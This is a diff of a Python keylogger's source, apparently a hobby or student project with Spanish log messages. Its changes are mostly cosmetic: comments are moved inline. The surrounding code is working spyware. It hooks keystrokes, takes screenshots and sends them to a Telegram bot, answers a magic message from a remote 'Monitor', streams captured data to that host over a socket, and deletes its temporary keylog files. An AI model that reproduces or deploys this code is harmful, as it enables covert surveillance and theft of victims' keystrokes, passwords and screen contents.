@@ -102,12 +102,8 @@ HOOK_PYNPUT     = 1                     # Module pynput
 ########################################################
 # GLOBAL VARIABLES
 ########################################################
-
-# key counter
-key_counter = 0
-
-# Previous event control. Used to detect when the user changes the window or application.
-old_event = None
+key_counter = 0     # key counter
+old_event = None    # Previous event control. Used to detect when the user changes the window or application.
 
 # Character buffer. Until it is full, it is not written to the file on disk, in this way continuous writes to disk
 # are avoided for each key pressed. When the args.keyminchars limit is exceeded the buffer is written to disk.
@@ -132,11 +128,9 @@ monitor_enable_send = False                     # Enabled? It could be avoided b
 monitor_ip = None                               # Destination IP
 monitor_port = DEFAULT_MONITOR_PORT             # Destination PORT
 
-# Global Mouse and Keyboard Hook for pyWinHook
-hm = None
+hm = None               # Global Mouse and Keyboard Hook for pyWinHook
+key_previous = None     # Previous key, used in pynput
 
-# Previous key, used in pynput
-key_previous = None
 
 ########################################################
 # CLASSES
@@ -150,12 +144,10 @@ class ScreenShootThread(threading.Thread):
 
     def run(self):
         logging.debug('Guardado captura {}'.format(self.screen_file))
-        # Take a screenshot using MSS module
-        with mss.mss() as sct:
+        with mss.mss() as sct:                      # Take a screenshot using MSS module
             self.screen_file = sct.shot(mon=1, output=self.screen_file)
         logging.debug('Fin captura {}'.format(self.screen_file))
-        # Send screenshot to Telegram bot
-        telegram_bot_image(self.screen_file)
+        telegram_bot_image(self.screen_file)        # Send screenshot to Telegram bot
 
 
 # Threading class to listen Monitor petitions and create client parameters for response and send data to monitor.
@@ -171,17 +163,15 @@ class ClientThread(threading.Thread):
         global monitor_ip, monitor_port, monitor_enable_send
 
         logging.info('Recibida petición de Monitor desde {}:{}'.format(self.ip,self.port))
-
-        # Process data / message
-        data = self.conn.recv(SERVER_BUFFER_SIZE).decode(ENCODING).rstrip()
+        data = self.conn.recv(SERVER_BUFFER_SIZE).decode(ENCODING).rstrip()     # Process data / message
         logging.debug('Se ha recibido: {}'.format(data))
 
         if data == MAGIC_MESSAGE:
-            logging.debug('Mensaje correcto. Conexion establecida. Respondiendo {} {}'.format(MAGIC_RESPONSE, self.response))
+            logging.debug('Mensaje correcto. Conexion establecida. Respondiendo {} {}'.
+                          format(MAGIC_RESPONSE, self.response))
             self.conn.sendall(self.response)
             logging.debug('Voy a iniciar conexion a {}:{}'.format(self.ip, monitor_port))
-            # Set data for reverse communication to the Monitor
-            monitor_ip = self.ip
+            monitor_ip = self.ip                # Set data for reverse communication to the Monitor
             monitor_enable_send = True
         else:
             msg = 'No tiene permiso.'
@@ -226,8 +216,7 @@ class ServerListenerThread(threading.Thread):
                 logging.error('Error recibiendo datos de cliente. Excepcion {} '.format(e))
                 break   # Possibly closed server
             else:
-                # Starts client response thread
-                client = ClientThread(conn, ip, port)
+                client = ClientThread(conn, ip, port)       # Starts client response thread
                 client.start()
                 self.client_threads.append(client)
 
@@ -250,29 +239,27 @@ def monitor_data_send(data_to_send):
     # Can send?
     if monitor_enable_send and monitor_ip is not None and monitor_port is not None:
         try:
-            # Open connection to monitor if not connection exists
-            if not monitor_soc:
+            if not monitor_soc:     # Open connection to monitor if not connection exists
                 monitor_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 monitor_soc.settimeout(MONITOR_SOCKET_TIMEOUT)
                 monitor_soc.connect((monitor_ip, monitor_port))
                 logging.debug('Created new Socket')
 
-            # Send Data
-            data_to_send = bytes(data_to_send, ENCODING)
+            data_to_send = bytes(data_to_send, ENCODING)        # Send Data
             monitor_soc.sendall(data_to_send)
             logging.debug('Sended :{}'.format(data_to_send))
         except Exception as ex:
-            logging.error('Error sending data to Monitor to {}:{}. Exception : {}'.format(monitor_ip, monitor_port, ex))
+            logging.error('Error sending data to Monitor to {}:{}. Exception : {}'.
+                          format(monitor_ip, monitor_port, ex))
     else:
-        # Close connection if not enabled Send
-        if monitor_soc:
+        if monitor_soc:     # Close connection if not enabled Send
             try:
                 monitor_soc.close()
             except:
                 pass
 
 
-# Kill Server and associated clients
+# Kill Server and associated clients : This function is maintained, but not used.
 def kill_server_clients():
     global server
 
@@ -282,17 +269,14 @@ def kill_server_clients():
         except Exception as e:
             logging.error('Error Stopping Server. Exception {}'.format(e))
 
-        # Kill clients
-        for client in server.client_threads:
+        for client in server.client_threads:        # Kill clients
             try:
                 client.close()
             except Exception as e:
                 logging.error('Error Killing client. Exception {}'.format(e))
 
-        # Kill Server
-        try:
+        try:                                        # Kill Server
             logging.info('Shutdown server')
-            # server.server_socket.shutdown(socket.SHUT_RDWR)
             server.server_socket.close()
         except Exception as e:
             logging.error('Server already closed. Exception {}'.format(e))
@@ -482,8 +466,8 @@ def send_keylog_file(keylog_name):
 # Delete all temporary keylog files.
 # A pattern and a message can be set and reused to erase the screenshot files.
 def delete_keylog_tempfile(pattern=None, logmsg='Borrado fichero temporal'):
-    if pattern is None:  # Si no se recibe patron, por defecto borra todos los ficheros de keylog
-        pattern = KLGPRE + '*' + KLGEXT  # If no pattern is received, by default it deletes all keylog files
+    if pattern is None:     # If no pattern is received, by default it deletes all keylog files
+        pattern = KLGPRE + '*' + KLGEXT
 
     count = 0
     folder_files = tempfile.gettempdir() + '\\' + pattern
@@ -815,7 +799,6 @@ def parse_params():
 ########################################################
 # MAIN
 ########################################################
-
 args = parse_params()  # Check and parse parameters
 
 # Sets logging settings
